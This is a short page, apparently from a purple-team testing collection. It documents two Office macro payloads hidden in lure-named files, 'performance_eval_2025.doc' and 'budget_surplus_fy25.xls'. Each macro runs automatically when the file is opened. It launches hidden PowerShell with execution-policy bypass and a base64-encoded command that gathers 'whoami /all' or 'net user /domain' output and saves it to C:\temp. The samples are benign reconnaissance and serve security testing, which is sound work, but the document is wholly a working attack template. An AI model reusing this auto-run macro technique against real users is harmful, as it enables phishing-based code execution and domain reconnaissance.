# Office Macro enabled coudments

## performance_eval_2025.doc

The following macro will execute on document open:

**Encoded Command:**
```powershell
mkdir C:\temp;whoami /all > C:\temp\word_macro_output.txt
```

```VBA
Private Sub format_document()
MsgBox "Purple Team Test - check 'C:\temp\word_macro_output.txt'", vbOKOnly, "Ok"
  a = Shell("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -exec bypass -enc bQBrAGQAaQByACAAQwA6AFwAdABlAG0AcAA7AHcAaABvAGEAbQBpACAALwBhAGwAbAAgAD4AIABDADoAXAB0AGUAbQBwAFwAdwBvAHIAZABfAG0AYQBjAHIAbwBfAG8AdQB0AHAAdQB0AC4AdAB4AHQA", vbHide)

End Sub
Sub Document_Open()
    format_document
End Sub
Sub AutoOpen()
    format_document
End Sub

```

## budget_surplus_fy25.xls

The following macro will execute on workbook open:

**Encoded Command:**
```powershell
mkdir C:\temp;cmd.exe /c "net user /domain > C:\temp\excel_macro_output.txt"
```

```VBA
Sub format_workbook()
MsgBox "Purple Team Test - check: 'C:\temp\excel_macro_output.txt'", vbOKOnly, "Ok"
  a = Shell("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -exec bypass -enc bQBrAGQAaQByACAAQwA6AFwAdABlAG0AcAA7AGMAbQBkAC4AZQB4AGUAIAAvAGMAIAAiAG4AZQB0ACAAdQBzAGUAcgAgAC8AZABvAG0AYQBpAG4AIAA+ACAAQwA6AFwAdABlAG0AcABcAGUAeABjAGUAbABfAG0AYQBjAHIAbwBfAG8AdQB0AHAAdQB0AC4AdAB4AHQAIgA=", vbHide)

End Sub
Private Sub Workbook_Open()
    format_workbook
End Sub
Private Sub AutoOpen()
    format_workbook
End Sub
```
